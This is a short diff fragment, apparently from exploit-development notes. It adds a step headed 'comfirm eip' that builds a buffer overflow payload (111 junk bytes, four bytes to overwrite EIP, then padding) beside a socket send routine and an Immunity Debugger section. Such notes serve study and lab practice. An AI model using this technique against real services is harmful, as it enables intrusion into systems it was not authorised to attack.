@@ -29,6 +29,13 @@ s.send(buffer)
 s.recv(1024)
 s.close()
 
+=======================
+comfirm eip 
+
+junk = 'A'*111
+eip = 'B'*4
+pad = 'C'*(1000-111-4) 
+
 ========================
 IMMUNITY
 
